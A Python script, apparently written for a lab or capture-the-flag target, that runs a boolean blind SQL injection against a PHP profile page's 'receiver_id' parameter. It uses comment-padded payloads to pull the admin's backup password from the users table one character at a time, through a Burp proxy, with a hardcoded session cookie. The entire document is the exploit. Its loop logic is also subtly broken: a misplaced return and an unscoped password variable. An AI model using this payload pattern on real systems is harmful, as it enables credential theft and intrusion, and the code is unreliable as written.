from bs4 import BeautifulSoup
import requests

proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}#设置代理，burpsuite抓包用

def send_injection_payload(base_url, payload, cookie):
    path = f"/pages/profile.php?user_id=14&&receiver_id={payload}"
    response = requests.get(base_url + path, cookies=cookie, proxies=proxies).text
    soup = BeautifulSoup(response, 'html.parser')
    followed = soup.find('span', string='Followed')
    if followed:
        return True
    return False

def sqli_exploit(cookie, base_url, receiver_id, token_length=12):
     for i in range(1, token_length + 1):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            # 需要用BINARY进行精确字符匹配，要不然MySQL 默认不区分大小写
            payload = f"{receiver_id}/**/AND/**/BINARY(SELECT/**/SUBSTRING(backup_password,{i},1)/**/FROM/**/users/**/WHERE/**/username='admin')='{char}'"
            result = send_injection_payload(base_url, payload, cookie)
            if result:
                admin_password += char
                print(f"[{i}/{token_length}] {admin_password}")
                break
            return admin_password
        else:
            print(f"Failed to extract character at position {i}")
            break

if __name__ == "__main__":
    cookie = {"PHPSESSID": "q5sho150m80btm56sb5oghkdcu"} #注意cookie是字典
    token_length = 12
    base_url = "http://192.168.145.240"
    admin_password = "" # 不能设置为None因为None不能进行字符串拼接
    receiver_id = 1
    admin_password = sqli_exploit(cookie, base_url, receiver_id, token_length)
    
